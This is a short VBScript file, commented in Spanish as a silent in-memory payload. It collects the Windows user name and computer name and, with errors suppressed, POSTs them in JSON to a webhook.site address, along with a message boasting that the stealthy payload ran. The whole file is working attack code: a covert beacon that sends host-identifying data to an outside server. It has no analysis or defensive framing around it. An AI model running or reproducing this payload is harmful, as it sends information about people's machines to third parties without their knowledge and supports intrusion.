' --- Payload VBScript Puro para Ejecución Silenciosa en Memoria ---
On Error Resume Next
    
Dim WshShell, WshNetwork, userName, computerName, jsonPayload, http

Set WshShell = CreateObject("WScript.Shell")
Set WshNetwork = CreateObject("WScript.Network")

userName = WshNetwork.UserName
computerName = WshNetwork.ComputerName

jsonPayload = "{""username"":""" & userName & """, ""computerName"":""" & computerName & """, ""message"":""Payload 100% SIGILOSO ejecutado!""}"

Set http = CreateObject("MSXML2.ServerXMLHTTP")

http.open "POST", "https://webhook.site/7fd9006c-0899-4a59-9b31-bda674f6acbc", False
http.setRequestHeader "Content-Type", "application/json; charset=UTF-8"
http.send jsonPayload